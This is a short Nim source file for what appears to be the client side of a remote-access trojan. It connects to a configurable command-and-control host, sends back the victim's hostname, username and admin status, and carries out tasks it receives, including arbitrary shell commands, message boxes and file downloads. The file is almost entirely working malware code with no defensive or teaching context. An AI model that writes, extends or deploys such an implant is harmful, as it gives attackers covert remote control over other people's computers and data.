import net, base64, json

import modules, communication

import ../commands/[shell, msgbox, download]

let client: Socket = newSocket()

const port {.intdefine.}: int = 1234
const ip {.strdefine.}: string = "127.0.0.1"

client.connect(ip, Port(port))

proc receiveCommands(client: Socket) =
  client.connectToC2()
  while true:
    let line = client.recvLine()

    if line.len == 0:
      echo "server down"
      quit(0)

    let task = decode(line)

    let jsonNode = parseJson(task)
    let taskId = jsonNode["taskId"].getInt()

    case jsonNode["task"].getStr():
    of "identify":
      client.identify(
        taskId,
        hostname=hostname(),
        username=username(), 
        isAdmin=areWeAdmin()
      )
    of "shell": 
      let toExec = jsonNode["data"]["shellCmd"].getStr()
      shell.executeTask(client, taskId, toExec)
    of "msgbox":
      msgbox.executeTask(client, taskId, jsonNode["data"]["title"].getStr(), jsonNode["data"]["caption"].getStr())
    of "download":
      download.executeTask(client, taskId, jsonNode["data"]["path"].getStr())

receiveCommands(client)
  
client.close()
